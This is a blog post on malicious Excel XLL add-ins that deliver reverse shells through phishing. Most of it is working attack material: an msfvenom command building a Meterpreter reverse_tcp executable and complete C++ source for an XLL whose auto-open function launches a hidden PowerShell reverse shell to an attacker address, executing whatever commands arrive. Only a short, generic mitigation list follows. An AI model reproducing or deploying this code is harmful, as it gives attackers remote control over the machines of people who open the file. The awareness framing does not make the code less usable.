---
title: "
The Dangers of Spreadsheets and XLL Files Containing Reverse Shells"
date: 2023-04-02 13:12:21
categories: [XLL, phishing]
tags: [revshell, XLL, phising, excel]
---

In today's world, cybersecurity is a constant concern for businesses and individuals alike. A recent and dangerous technique involves using spreadsheets and XLL files to inject reverse shells into systems, compromising their security. This article explores the dangers associated with these files and how they can be used by attackers to gain remote control over systems.

#### What Are XLL Files? 

XLL files are add-ins for Microsoft Excel that function similarly to DLL files. They allow custom functions to be executed within Excel, extending its capabilities. However, this same functionality can be exploited maliciously.

#### Exploitation Example: Analysis of a Malicious File 
Recently, a malicious XLL file was analyzed on VirusTotal, a popular malware analysis tool. The file in question, identified by the hash `2b71333124cd4296df694f54203e5b8c9022ba6874a2e7f630310adde7ffba80`, demonstrated how an XLL file can be used to compromise systems.**Link to full analysis** : [VirusTotal Analysis](https://www.virustotal.com/gui/file/2b71333124cd4296df694f54203e5b8c9022ba6874a2e7f630310adde7ffba80?nocache=1) 
#### How Reverse Shell Exploitation Works 

A reverse shell is a network connection where the target connects back to the attacker, allowing the attacker to gain remote control over the compromised system. Let's understand how this can be done using XLL files.

### Creating a Malicious Payload 
Using tools like `msfvenom`, an attacker can create a payload that, when executed, opens a reverse connection:

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4446 -f exe -o standalonerunner.exe
```
 
- **`-p windows/x64/meterpreter/reverse_tcp`** : Specifies the payload for Windows 64-bit.
 
- **`LHOST=10.10.14.7`** : Sets the attacker's IP address.
 
- **`LPORT=4446`** : Sets the port used for the reverse connection.
 
- **`-f exe`** : Specifies that the payload format will be a Windows executable.
 
- **`-o standalonerunner.exe`** : Sets the name of the output file.

### Creating a Malicious XLL File 

Below is an example of C++ code that can be compiled into a malicious XLL file to execute the payload:


```cpp
#include <windows.h>
#include <stdio.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void);

void __cdecl xlAutoOpen() {
    const char* command = "powershell -nop -W hidden -noni -ep bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',4446);";
    const char* command2 = "$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};";
    const char* command3 = "while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){";
    const char* command4 = "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);";
    const char* command5 = "if ($data.Trim().Length -gt 0) {";
    const char* command6 = "$sendback = (iex $data 2>&1 | Out-String );";
    const char* command7 = "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';";
    const char* command8 = "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);";
    const char* command9 = "$stream.Write($sendbyte, 0, $sendbyte.Length);";
    const char* command10 = "$stream.Flush()}};$client.Close()\"";

    char full_command[2048];
    snprintf(full_command, sizeof(full_command), "%s%s%s%s%s%s%s%s%s%s", command, command2, command3, command4, command5, command6, command7, command8, command9, command10);
    WinExec(full_command, 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

### Distribution via Phishing 

Once the malicious XLL file is created, it can be distributed through phishing campaigns. The attacker sends an email with a link or attachment containing the XLL file. When the victim opens the file in Excel, the payload is executed and the reverse connection is established.

### Mitigation and Detection 

To protect against this type of attack, it is essential to implement multiple layers of security:
 
1. **Education and Training** :
  - Train employees to recognize and avoid phishing emails.
 
2. **Antivirus and Antimalware** :
  - Use up-to-date security software that can detect and block malicious files.
 
3. **Excel Security Settings** :
  - Configure Excel to alert or block the opening of XLL files from untrusted sources.
 
4. **Network Monitoring** :
  - Implement network monitoring tools to detect suspicious activities, such as unexpected reverse connections.
 
5. **Script Execution Policies** :
  - Restrict script and macro execution in environments where they are not needed.

### Conclusion 

Exploitation through spreadsheets and XLL files containing reverse shells is a sophisticated and dangerous technique. Understanding these methods and implementing appropriate security measures can significantly reduce the risk of system compromise.

Share this article to help raise awareness about these dangers and stay informed about best security practices to protect your organization against emerging threats.